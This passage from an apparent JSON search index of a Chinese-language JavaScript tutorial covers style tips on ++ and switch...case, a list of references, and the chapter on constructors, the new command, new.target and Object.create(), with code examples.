\u5efa\u8bae\u4e0d\u8981\u5c06\u4e0d\u540c\u76ee\u7684\u7684\u8bed\u53e5\uff0c\u5408\u5e76\u6210\u4e00\u884c\u3002","title":"\u8bed\u53e5\u7684\u5408\u5e76"},{"location":"features/style/#_13","text":"\u81ea\u589e\uff08 ++ \uff09\u548c\u81ea\u51cf\uff08 -- \uff09\u8fd0\u7b97\u7b26\uff0c\u653e\u5728\u53d8\u91cf\u7684\u524d\u9762\u6216\u540e\u9762\uff0c\u8fd4\u56de\u7684\u503c\u4e0d\u4e00\u6837\uff0c\u5f88\u5bb9\u6613\u53d1\u751f\u9519\u8bef\u3002\u4e8b\u5b9e\u4e0a\uff0c\u6240\u6709\u7684 ++ \u8fd0\u7b97\u7b26\u90fd\u53ef\u4ee5\u7528 += 1 \u4ee3\u66ff\u3002 1 2 3 ++ x // \u7b49\u540c\u4e8e x += 1 ; \u6539\u7528 += 1 \uff0c\u4ee3\u7801\u53d8\u5f97\u66f4\u6e05\u6670\u4e86\u3002 \u5efa\u8bae\u81ea\u589e\uff08 ++ \uff09\u548c\u81ea\u51cf\uff08 -- \uff09\u8fd0\u7b97\u7b26\u5c3d\u91cf\u4f7f\u7528 += \u548c -= \u4ee3\u66ff\u3002","title":"\u81ea\u589e\u548c\u81ea\u51cf\u8fd0\u7b97\u7b26"},{"location":"features/style/#switchcase","text":"switch...case \u7ed3\u6784\u8981\u6c42\uff0c\u5728\u6bcf\u4e00\u4e2a case \u7684\u6700\u540e\u4e00\u884c\u5fc5\u987b\u662f break \u8bed\u53e5\uff0c\u5426\u5219\u4f1a\u63a5\u7740\u8fd0\u884c\u4e0b\u4e00\u4e2a case \u3002\u8fd9\u6837\u4e0d\u4ec5\u5bb9\u6613\u5fd8\u8bb0\uff0c\u8fd8\u4f1a\u9020\u6210\u4ee3\u7801\u7684\u5197\u957f\u3002 \u800c\u4e14\uff0c switch...case \u4e0d\u4f7f\u7528\u5927\u62ec\u53f7\uff0c\u4e0d\u5229\u4e8e\u4ee3\u7801\u5f62\u5f0f\u7684\u7edf\u4e00\u3002\u6b64\u5916\uff0c\u8fd9\u79cd\u7ed3\u6784\u7c7b\u4f3c\u4e8e goto \u8bed\u53e5\uff0c\u5bb9\u6613\u9020\u6210\u7a0b\u5e8f\u6d41\u7a0b\u7684\u6df7\u4e71\uff0c\u4f7f\u5f97\u4ee3\u7801\u7ed3\u6784\u6df7\u4e71\u4e0d\u582a\uff0c\u4e0d\u7b26\u5408\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u539f\u5219\u3002 1 2 3 4 5 6 7 8 9 10 11 12 function doAction ( action ) { switch ( action ) { case 'hack' : return 'hack' ; case 'slash' : return 'slash' ; case 'run' : return 'run' ; default : throw new Error ( 'Invalid action.' ); } } \u4e0a\u9762\u7684\u4ee3\u7801\u5efa\u8bae\u6539\u5199\u6210\u5bf9\u8c61\u7ed3\u6784\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function doAction ( action ) { var actions = { 'hack' : function () { return 'hack' ; }, 'slash' : function () { return 'slash' ; }, 'run' : function () { return 'run' ; } }; if ( typeof actions [ action ] !== 'function' ) { throw new Error ( 'Invalid action.' ); } return actions [ action ](); } \u56e0\u6b64\uff0c\u5efa\u8bae switch...case \u7ed3\u6784\u53ef\u4ee5\u7528\u5bf9\u8c61\u7ed3\u6784\u4ee3\u66ff\u3002","title":"switch...case \u7ed3\u6784"},{"location":"features/style/#_14","text":"Eric Elliott, Programming JavaScript Applications, Chapter 2. JavaScript Style Guide , O'Reilly, 2013 Axel Rauschmayer, A meta style guide for JavaScript Axel Rauschmayer, Automatic semicolon insertion in JavaScript Rod Vagg, JavaScript and Semicolons","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"oop/new/","text":"\u5b9e\u4f8b\u5bf9\u8c61\u4e0e new \u547d\u4ee4 \u00b6 JavaScript \u8bed\u8a00\u5177\u6709\u5f88\u5f3a\u7684\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u80fd\u529b\uff0c\u672c\u7ae0\u4ecb\u7ecd JavaScript \u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u57fa\u7840\u77e5\u8bc6\u3002 \u5bf9\u8c61\u662f\u4ec0\u4e48 \u00b6 \u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\uff08Object Oriented Programming\uff0c\u7f29\u5199\u4e3a OOP\uff09\u662f\u76ee\u524d\u4e3b\u6d41\u7684\u7f16\u7a0b\u8303\u5f0f\u3002\u5b83\u5c06\u771f\u5b9e\u4e16\u754c\u5404\u79cd\u590d\u6742\u7684\u5173\u7cfb\uff0c\u62bd\u8c61\u4e3a\u4e00\u4e2a\u4e2a\u5bf9\u8c61\uff0c\u7136\u540e\u7531\u5bf9\u8c61\u4e4b\u95f4\u7684\u5206\u5de5\u4e0e\u5408\u4f5c\uff0c\u5b8c\u6210\u5bf9\u771f\u5b9e\u4e16\u754c\u7684\u6a21\u62df\u3002 \u6bcf\u4e00\u4e2a\u5bf9\u8c61\u90fd\u662f\u529f\u80fd\u4e2d\u5fc3\uff0c\u5177\u6709\u660e\u786e\u5206\u5de5\uff0c\u53ef\u4ee5\u5b8c\u6210\u63a5\u53d7\u4fe1\u606f\u3001\u5904\u7406\u6570\u636e\u3001\u53d1\u51fa\u4fe1\u606f\u7b49\u4efb\u52a1\u3002\u5bf9\u8c61\u53ef\u4ee5\u590d\u7528\uff0c\u901a\u8fc7\u7ee7\u627f\u673a\u5236\u8fd8\u53ef\u4ee5\u5b9a\u5236\u3002\u56e0\u6b64\uff0c\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u5177\u6709\u7075\u6d3b\u3001\u4ee3\u7801\u53ef\u590d\u7528\u3001\u9ad8\u5ea6\u6a21\u5757\u5316\u7b49\u7279\u70b9\uff0c\u5bb9\u6613\u7ef4\u62a4\u548c\u5f00\u53d1\uff0c\u6bd4\u8d77\u7531\u4e00\u7cfb\u5217\u51fd\u6570\u6216\u6307\u4ee4\u7ec4\u6210\u7684\u4f20\u7edf\u7684\u8fc7\u7a0b\u5f0f\u7f16\u7a0b\uff08procedural programming\uff09\uff0c\u66f4\u9002\u5408\u591a\u4eba\u5408\u4f5c\u7684\u5927\u578b\u8f6f\u4ef6\u9879\u76ee\u3002 \u90a3\u4e48\uff0c\u201c\u5bf9\u8c61\u201d\uff08object\uff09\u5230\u5e95\u662f\u4ec0\u4e48\uff1f\u6211\u4eec\u4ece\u4e24\u4e2a\u5c42\u6b21\u6765\u7406\u89e3\u3002 \uff081\uff09\u5bf9\u8c61\u662f\u5355\u4e2a\u5b9e\u7269\u7684\u62bd\u8c61\u3002 \u4e00\u672c\u4e66\u3001\u4e00\u8f86\u6c7d\u8f66\u3001\u4e00\u4e2a\u4eba\u90fd\u53ef\u4ee5\u662f\u5bf9\u8c61\uff0c\u4e00\u4e2a\u6570\u636e\u5e93\u3001\u4e00\u5f20\u7f51\u9875\u3001\u4e00\u4e2a\u8fdc\u7a0b\u670d\u52a1\u5668\u8fde\u63a5\u4e5f\u53ef\u4ee5\u662f\u5bf9\u8c61\u3002\u5f53\u5b9e\u7269\u88ab\u62bd\u8c61\u6210\u5bf9\u8c61\uff0c\u5b9e\u7269\u4e4b\u95f4\u7684\u5173\u7cfb\u5c31\u53d8\u6210\u4e86\u5bf9\u8c61\u4e4b\u95f4\u7684\u5173\u7cfb\uff0c\u4ece\u800c\u5c31\u53ef\u4ee5\u6a21\u62df\u73b0\u5b9e\u60c5\u51b5\uff0c\u9488\u5bf9\u5bf9\u8c61\u8fdb\u884c\u7f16\u7a0b\u3002 \uff082\uff09\u5bf9\u8c61\u662f\u4e00\u4e2a\u5bb9\u5668\uff0c\u5c01\u88c5\u4e86\u5c5e\u6027\uff08property\uff09\u548c\u65b9\u6cd5\uff08method\uff09\u3002 \u5c5e\u6027\u662f\u5bf9\u8c61\u7684\u72b6\u6001\uff0c\u65b9\u6cd5\u662f\u5bf9\u8c61\u7684\u884c\u4e3a\uff08\u5b8c\u6210\u67d0\u79cd\u4efb\u52a1\uff09\u3002\u6bd4\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u52a8\u7269\u62bd\u8c61\u4e3a animal \u5bf9\u8c61\uff0c\u4f7f\u7528\u201c\u5c5e\u6027\u201d\u8bb0\u5f55\u5177\u4f53\u662f\u54ea\u4e00\u79cd\u52a8\u7269\uff0c\u4f7f\u7528\u201c\u65b9\u6cd5\u201d\u8868\u793a\u52a8\u7269\u7684\u67d0\u79cd\u884c\u4e3a\uff08\u5954\u8dd1\u3001\u6355\u730e\u3001\u4f11\u606f\u7b49\u7b49\uff09\u3002 \u6784\u9020\u51fd\u6570 \u00b6 \u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u7b2c\u4e00\u6b65\uff0c\u5c31\u662f\u8981\u751f\u6210\u5bf9\u8c61\u3002\u524d\u9762\u8bf4\u8fc7\uff0c\u5bf9\u8c61\u662f\u5355\u4e2a\u5b9e\u7269\u7684\u62bd\u8c61\u3002\u901a\u5e38\u9700\u8981\u4e00\u4e2a\u6a21\u677f\uff0c\u8868\u793a\u67d0\u4e00\u7c7b\u5b9e\u7269\u7684\u5171\u540c\u7279\u5f81\uff0c\u7136\u540e\u5bf9\u8c61\u6839\u636e\u8fd9\u4e2a\u6a21\u677f\u751f\u6210\u3002 \u5178\u578b\u7684\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u8bed\u8a00\uff08\u6bd4\u5982 C++ \u548c Java\uff09\uff0c\u90fd\u6709\u201c\u7c7b\u201d\uff08class\uff09\u8fd9\u4e2a\u6982\u5ff5\u3002\u6240\u8c13\u201c\u7c7b\u201d\u5c31\u662f\u5bf9\u8c61\u7684\u6a21\u677f\uff0c\u5bf9\u8c61\u5c31\u662f\u201c\u7c7b\u201d\u7684\u5b9e\u4f8b\u3002\u4f46\u662f\uff0cJavaScript \u8bed\u8a00\u7684\u5bf9\u8c61\u4f53\u7cfb\uff0c\u4e0d\u662f\u57fa\u4e8e\u201c\u7c7b\u201d\u7684\uff0c\u800c\u662f\u57fa\u4e8e\u6784\u9020\u51fd\u6570\uff08constructor\uff09\u548c\u539f\u578b\u94fe\uff08prototype\uff09\u3002 JavaScript \u8bed\u8a00\u4f7f\u7528\u6784\u9020\u51fd\u6570\uff08constructor\uff09\u4f5c\u4e3a\u5bf9\u8c61\u7684\u6a21\u677f\u3002\u6240\u8c13\u201d\u6784\u9020\u51fd\u6570\u201d\uff0c\u5c31\u662f\u4e13\u95e8\u7528\u6765\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\u7684\u51fd\u6570\u3002\u5b83\u5c31\u662f\u5bf9\u8c61\u7684\u6a21\u677f\uff0c\u63cf\u8ff0\u5b9e\u4f8b\u5bf9\u8c61\u7684\u57fa\u672c\u7ed3\u6784\u3002\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u751f\u6210\u591a\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8fd9\u4e9b\u5b9e\u4f8b\u5bf9\u8c61\u90fd\u6709\u76f8\u540c\u7684\u7ed3\u6784\u3002 \u6784\u9020\u51fd\u6570\u5c31\u662f\u4e00\u4e2a\u666e\u901a\u7684\u51fd\u6570\uff0c\u4f46\u5177\u6709\u81ea\u5df1\u7684\u7279\u5f81\u548c\u7528\u6cd5\u3002 1 2 3 var Vehicle = function () { this . price = 1000 ; }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Vehicle \u5c31\u662f\u6784\u9020\u51fd\u6570\u3002\u4e3a\u4e86\u4e0e\u666e\u901a\u51fd\u6570\u533a\u522b\uff0c\u6784\u9020\u51fd\u6570\u540d\u5b57\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u901a\u5e38\u5927\u5199\u3002 \u6784\u9020\u51fd\u6570\u7684\u7279\u70b9\u6709\u4e24\u4e2a\u3002 \u51fd\u6570\u4f53\u5185\u90e8\u4f7f\u7528\u4e86 this \u5173\u952e\u5b57\uff0c\u4ee3\u8868\u4e86\u6240\u8981\u751f\u6210\u7684\u5bf9\u8c61\u5b9e\u4f8b\u3002 \u751f\u6210\u5bf9\u8c61\u7684\u65f6\u5019\uff0c\u5fc5\u987b\u4f7f\u7528 new \u547d\u4ee4\u3002 \u4e0b\u9762\u5148\u4ecb\u7ecd new \u547d\u4ee4\u3002 new \u547d\u4ee4 \u00b6 \u57fa\u672c\u7528\u6cd5 \u00b6 new \u547d\u4ee4\u7684\u4f5c\u7528\uff0c\u5c31\u662f\u6267\u884c\u6784\u9020\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u3002 1 2 3 4 5 6 var Vehicle = function () { this . price = 1000 ; }; var v = new Vehicle (); v . price // 1000 \u4e0a\u9762\u4ee3\u7801\u901a\u8fc7 new \u547d\u4ee4\uff0c\u8ba9\u6784\u9020\u51fd\u6570 Vehicle \u751f\u6210\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u4fdd\u5b58\u5728\u53d8\u91cf v \u4e2d\u3002\u8fd9\u4e2a\u65b0\u751f\u6210\u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u4ece\u6784\u9020\u51fd\u6570 Vehicle \u5f97\u5230\u4e86 price \u5c5e\u6027\u3002 new \u547d\u4ee4\u6267\u884c\u65f6\uff0c\u6784\u9020\u51fd\u6570\u5185\u90e8\u7684 this \uff0c\u5c31\u4ee3\u8868\u4e86\u65b0\u751f\u6210\u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c this.price \u8868\u793a\u5b9e\u4f8b\u5bf9\u8c61\u6709\u4e00\u4e2a price \u5c5e\u6027\uff0c\u503c\u662f1000\u3002 \u4f7f\u7528 new \u547d\u4ee4\u65f6\uff0c\u6839\u636e\u9700\u8981\uff0c\u6784\u9020\u51fd\u6570\u4e5f\u53ef\u4ee5\u63a5\u53d7\u53c2\u6570\u3002 1 2 3 4 5 var Vehicle = function ( p ) { this . price = p ; }; var v = new Vehicle ( 500 ); new \u547d\u4ee4\u672c\u8eab\u5c31\u53ef\u4ee5\u6267\u884c\u6784\u9020\u51fd\u6570\uff0c\u6240\u4ee5\u540e\u9762\u7684\u6784\u9020\u51fd\u6570\u53ef\u4ee5\u5e26\u62ec\u53f7\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u5e26\u62ec\u53f7\u3002\u4e0b\u9762\u4e24\u884c\u4ee3\u7801\u662f\u7b49\u4ef7\u7684\uff0c\u4f46\u662f\u4e3a\u4e86\u8868\u793a\u8fd9\u91cc\u662f\u51fd\u6570\u8c03\u7528\uff0c\u63a8\u8350\u4f7f\u7528\u62ec\u53f7\u3002 1 2 3 4 // \u63a8\u8350\u7684\u5199\u6cd5 var v = new Vehicle (); // \u4e0d\u63a8\u8350\u7684\u5199\u6cd5 var v = new Vehicle ; \u4e00\u4e2a\u5f88\u81ea\u7136\u7684\u95ee\u9898\u662f\uff0c\u5982\u679c\u5fd8\u4e86\u4f7f\u7528 new \u547d\u4ee4\uff0c\u76f4\u63a5\u8c03\u7528\u6784\u9020\u51fd\u6570\u4f1a\u53d1\u751f\u4ec0\u4e48\u4e8b\uff1f \u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6784\u9020\u51fd\u6570\u5c31\u53d8\u6210\u4e86\u666e\u901a\u51fd\u6570\uff0c\u5e76\u4e0d\u4f1a\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\u3002\u800c\u4e14\u7531\u4e8e\u540e\u9762\u4f1a\u8bf4\u5230\u7684\u539f\u56e0\uff0c this \u8fd9\u65f6\u4ee3\u8868\u5168\u5c40\u5bf9\u8c61\uff0c\u5c06\u9020\u6210\u4e00\u4e9b\u610f\u60f3\u4e0d\u5230\u7684\u7ed3\u679c\u3002 1 2 3 4 5 6 7 var Vehicle = function (){ this . price = 1000 ; }; var v = Vehicle (); v // undefined price // 1000 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8c03\u7528 Vehicle \u6784\u9020\u51fd\u6570\u65f6\uff0c\u5fd8\u4e86\u52a0\u4e0a new \u547d\u4ee4\u3002\u7ed3\u679c\uff0c\u53d8\u91cf v \u53d8\u6210\u4e86 undefined \uff0c\u800c price \u5c5e\u6027\u53d8\u6210\u4e86\u5168\u5c40\u53d8\u91cf\u3002\u56e0\u6b64\uff0c\u5e94\u8be5\u975e\u5e38\u5c0f\u5fc3\uff0c\u907f\u514d\u4e0d\u4f7f\u7528 new \u547d\u4ee4\u3001\u76f4\u63a5\u8c03\u7528\u6784\u9020\u51fd\u6570\u3002 \u4e3a\u4e86\u4fdd\u8bc1\u6784\u9020\u51fd\u6570\u5fc5\u987b\u4e0e new \u547d\u4ee4\u4e00\u8d77\u4f7f\u7528\uff0c\u4e00\u4e2a\u89e3\u51b3\u529e\u6cd5\u662f\uff0c\u6784\u9020\u51fd\u6570\u5185\u90e8\u4f7f\u7528\u4e25\u683c\u6a21\u5f0f\uff0c\u5373\u7b2c\u4e00\u884c\u52a0\u4e0a use strict \u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u4e00\u65e6\u5fd8\u4e86\u4f7f\u7528 new \u547d\u4ee4\uff0c\u76f4\u63a5\u8c03\u7528\u6784\u9020\u51fd\u6570\u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 function Fubar ( foo , bar ){ 'use strict' ; this . _foo = foo ; this . _bar = bar ; } Fubar () // TypeError: Cannot set property '_foo' of undefined \u4e0a\u9762\u4ee3\u7801\u7684 Fubar \u4e3a\u6784\u9020\u51fd\u6570\uff0c use strict \u547d\u4ee4\u4fdd\u8bc1\u4e86\u8be5\u51fd\u6570\u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\u8fd0\u884c\u3002\u7531\u4e8e\u4e25\u683c\u6a21\u5f0f\u4e2d\uff0c\u51fd\u6570\u5185\u90e8\u7684 this \u4e0d\u80fd\u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff0c\u9ed8\u8ba4\u7b49\u4e8e undefined \uff0c\u5bfc\u81f4\u4e0d\u52a0 new \u8c03\u7528\u4f1a\u62a5\u9519\uff08JavaScript \u4e0d\u5141\u8bb8\u5bf9 undefined \u6dfb\u52a0\u5c5e\u6027\uff09\u3002 \u53e6\u4e00\u4e2a\u89e3\u51b3\u529e\u6cd5\uff0c\u6784\u9020\u51fd\u6570\u5185\u90e8\u5224\u65ad\u662f\u5426\u4f7f\u7528 new \u547d\u4ee4\uff0c\u5982\u679c\u53d1\u73b0\u6ca1\u6709\u4f7f\u7528\uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 function Fubar ( foo , bar ) { if ( ! ( this instanceof Fubar )) { return new Fubar ( foo , bar ); } this . _foo = foo ; this . _bar = bar ; } Fubar ( 1 , 2 ). _foo // 1 ( new Fubar ( 1 , 2 )). _foo // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\u7684\u6784\u9020\u51fd\u6570\uff0c\u4e0d\u7ba1\u52a0\u4e0d\u52a0 new \u547d\u4ee4\uff0c\u90fd\u4f1a\u5f97\u5230\u540c\u6837\u7684\u7ed3\u679c\u3002 new \u547d\u4ee4\u7684\u539f\u7406 \u00b6 \u4f7f\u7528 new \u547d\u4ee4\u65f6\uff0c\u5b83\u540e\u9762\u7684\u51fd\u6570\u4f9d\u6b21\u6267\u884c\u4e0b\u9762\u7684\u6b65\u9aa4\u3002 \u521b\u5efa\u4e00\u4e2a\u7a7a\u5bf9\u8c61\uff0c\u4f5c\u4e3a\u5c06\u8981\u8fd4\u56de\u7684\u5bf9\u8c61\u5b9e\u4f8b\u3002 \u5c06\u8fd9\u4e2a\u7a7a\u5bf9\u8c61\u7684\u539f\u578b\uff0c\u6307\u5411\u6784\u9020\u51fd\u6570\u7684 prototype \u5c5e\u6027\u3002 \u5c06\u8fd9\u4e2a\u7a7a\u5bf9\u8c61\u8d4b\u503c\u7ed9\u51fd\u6570\u5185\u90e8\u7684 this \u5173\u952e\u5b57\u3002 \u5f00\u59cb\u6267\u884c\u6784\u9020\u51fd\u6570\u5185\u90e8\u7684\u4ee3\u7801\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0c\u6784\u9020\u51fd\u6570\u5185\u90e8\uff0c this \u6307\u7684\u662f\u4e00\u4e2a\u65b0\u751f\u6210\u7684\u7a7a\u5bf9\u8c61\uff0c\u6240\u6709\u9488\u5bf9 this \u7684\u64cd\u4f5c\uff0c\u90fd\u4f1a\u53d1\u751f\u5728\u8fd9\u4e2a\u7a7a\u5bf9\u8c61\u4e0a\u3002\u6784\u9020\u51fd\u6570\u4e4b\u6240\u4ee5\u53eb\u201c\u6784\u9020\u51fd\u6570\u201d\uff0c\u5c31\u662f\u8bf4\u8fd9\u4e2a\u51fd\u6570\u7684\u76ee\u7684\uff0c\u5c31\u662f\u64cd\u4f5c\u4e00\u4e2a\u7a7a\u5bf9\u8c61\uff08\u5373 this \u5bf9\u8c61\uff09\uff0c\u5c06\u5176\u201c\u6784\u9020\u201d\u4e3a\u9700\u8981\u7684\u6837\u5b50\u3002 \u5982\u679c\u6784\u9020\u51fd\u6570\u5185\u90e8\u6709 return \u8bed\u53e5\uff0c\u800c\u4e14 return \u540e\u9762\u8ddf\u7740\u4e00\u4e2a\u5bf9\u8c61\uff0c new \u547d\u4ee4\u4f1a\u8fd4\u56de return \u8bed\u53e5\u6307\u5b9a\u7684\u5bf9\u8c61\uff1b\u5426\u5219\uff0c\u5c31\u4f1a\u4e0d\u7ba1 return \u8bed\u53e5\uff0c\u8fd4\u56de this \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 var Vehicle = function () { this . price = 1000 ; return 1000 ; }; ( new Vehicle ()) === 1000 // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6784\u9020\u51fd\u6570 Vehicle \u7684 return \u8bed\u53e5\u8fd4\u56de\u4e00\u4e2a\u6570\u503c\u3002\u8fd9\u65f6\uff0c new \u547d\u4ee4\u5c31\u4f1a\u5ffd\u7565\u8fd9\u4e2a return \u8bed\u53e5\uff0c\u8fd4\u56de\u201c\u6784\u9020\u201d\u540e\u7684 this \u5bf9\u8c61\u3002 \u4f46\u662f\uff0c\u5982\u679c return \u8bed\u53e5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u8ddf this \u65e0\u5173\u7684\u65b0\u5bf9\u8c61\uff0c new \u547d\u4ee4\u4f1a\u8fd4\u56de\u8fd9\u4e2a\u65b0\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f this \u5bf9\u8c61\u3002\u8fd9\u4e00\u70b9\u9700\u8981\u7279\u522b\u5f15\u8d77\u6ce8\u610f\u3002 1 2 3 4 5 6 7 var Vehicle = function (){ this . price = 1000 ; return { price : 2000 }; }; ( new Vehicle ()). price // 2000 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6784\u9020\u51fd\u6570 Vehicle \u7684 return \u8bed\u53e5\uff0c\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u65b0\u5bf9\u8c61\u3002 new \u547d\u4ee4\u4f1a\u8fd4\u56de\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f this \u5bf9\u8c61\u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u5982\u679c\u5bf9\u666e\u901a\u51fd\u6570\uff08\u5185\u90e8\u6ca1\u6709 this \u5173\u952e\u5b57\u7684\u51fd\u6570\uff09\u4f7f\u7528 new \u547d\u4ee4\uff0c\u5219\u4f1a\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 function getMessage () { return 'this is a message' ; } var msg = new getMessage (); msg // {} typeof msg // \"object\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c getMessage \u662f\u4e00\u4e2a\u666e\u901a\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u5bf9\u5b83\u4f7f\u7528 new \u547d\u4ee4\uff0c\u4f1a\u5f97\u5230\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u3002\u8fd9\u662f\u56e0\u4e3a new \u547d\u4ee4\u603b\u662f\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8981\u4e48\u662f\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8981\u4e48\u662f return \u8bed\u53e5\u6307\u5b9a\u7684\u5bf9\u8c61\u3002\u672c\u4f8b\u4e2d\uff0c return \u8bed\u53e5\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5 new \u547d\u4ee4\u5c31\u5ffd\u7565\u4e86\u8be5\u8bed\u53e5\u3002 new \u547d\u4ee4\u7b80\u5316\u7684\u5185\u90e8\u6d41\u7a0b\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u8868\u793a\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function _new ( /* \u6784\u9020\u51fd\u6570 */ constructor , /* \u6784\u9020\u51fd\u6570\u53c2\u6570 */ params ) { // \u5c06 arguments \u5bf9\u8c61\u8f6c\u4e3a\u6570\u7ec4 var args = []. slice . call ( arguments ); // \u53d6\u51fa\u6784\u9020\u51fd\u6570 var constructor = args . shift (); // \u521b\u5efa\u4e00\u4e2a\u7a7a\u5bf9\u8c61\uff0c\u7ee7\u627f\u6784\u9020\u51fd\u6570\u7684 prototype \u5c5e\u6027 var context = Object . create ( constructor . prototype ); // \u6267\u884c\u6784\u9020\u51fd\u6570 var result = constructor . apply ( context , args ); // \u5982\u679c\u8fd4\u56de\u7ed3\u679c\u662f\u5bf9\u8c61\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\uff0c\u5426\u5219\u8fd4\u56de context \u5bf9\u8c61 return ( typeof result === 'object' && result != null ) ? result : context ; } // \u5b9e\u4f8b var actor = _new ( Person , '\u5f20\u4e09' , 28 ); new.target \u00b6 \u51fd\u6570\u5185\u90e8\u53ef\u4ee5\u4f7f\u7528 new.target \u5c5e\u6027\u3002\u5982\u679c\u5f53\u524d\u51fd\u6570\u662f new \u547d\u4ee4\u8c03\u7528\uff0c new.target \u6307\u5411\u5f53\u524d\u51fd\u6570\uff0c\u5426\u5219\u4e3a undefined \u3002 1 2 3 4 5 6 function f () { console . log ( new . target === f ); } f () // false new f () // true \u4f7f\u7528\u8fd9\u4e2a\u5c5e\u6027\uff0c\u53ef\u4ee5\u5224\u65ad\u51fd\u6570\u8c03\u7528\u7684\u65f6\u5019\uff0c\u662f\u5426\u4f7f\u7528 new \u547d\u4ee4\u3002 1 2 3 4 5 6 7 8 function f () { if ( ! new . target ) { throw new Error ( '\u8bf7\u4f7f\u7528 new \u547d\u4ee4\u8c03\u7528\uff01' ); } // ... } f () // Uncaught Error: \u8bf7\u4f7f\u7528 new \u547d\u4ee4\u8c03\u7528\uff01 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6784\u9020\u51fd\u6570 f \u8c03\u7528\u65f6\uff0c\u6ca1\u6709\u4f7f\u7528 new \u547d\u4ee4\uff0c\u5c31\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002 Object.create() \u521b\u5efa\u5b9e\u4f8b\u5bf9\u8c61 \u00b6 \u6784\u9020\u51fd\u6570\u4f5c\u4e3a\u6a21\u677f\uff0c\u53ef\u4ee5\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\u3002\u4f46\u662f\uff0c\u6709\u65f6\u62ff\u4e0d\u5230\u6784\u9020\u51fd\u6570\uff0c\u53ea\u80fd\u62ff\u5230\u4e00\u4e2a\u73b0\u6709\u7684\u5bf9\u8c61\u3002\u6211\u4eec\u5e0c\u671b\u4ee5\u8fd9\u4e2a\u73b0\u6709\u7684\u5bf9\u8c61\u4f5c\u4e3a\u6a21\u677f\uff0c\u751f\u6210\u65b0\u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8fd9\u65f6\u5c31\u53ef\u4ee5\u4f7f\u7528 Object.create() \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var person1 = { name : '\u5f20\u4e09' , age : 38 , greeting : function () { console . log ( 'Hi! I\\'m ' + this . name + '.' ); } }; var person2 = Object . create ( person1 ); person2 . name // \u5f20\u4e09 person2 . greeting () // Hi! I'm \u5f20\u4e09. \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 person1 \u662f person2 \u7684\u6a21\u677f\uff0c\u540e\u8005\u7ee7\u627f\u4e86\u524d\u8005\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 Object.create() \u7684\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u8bf7\u770b\u540e\u9762\u7684\u76f8\u5173\u7ae0\u8282\u3002","title":"\u5b9e\u4f8b\u5bf9\u8c61\u4e0e new \u547d\u4ee4"},{"location":"oop/new/#new","text":"JavaScript \u8bed\u8a00\u5177\u6709\u5f88\u5f3a\u7684\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u80fd\u529b\uff0c\u672c\u7ae0\u4ecb\u7ecd JavaScript \u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u57fa\u7840\u77e5\u8bc6\u3002","title":"\u5b9e\u4f8b\u5bf9\u8c61\u4e0e new \u547d\u4ee4"},{"location":"oop/new/#_1","text":"\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\uff08Object Oriented 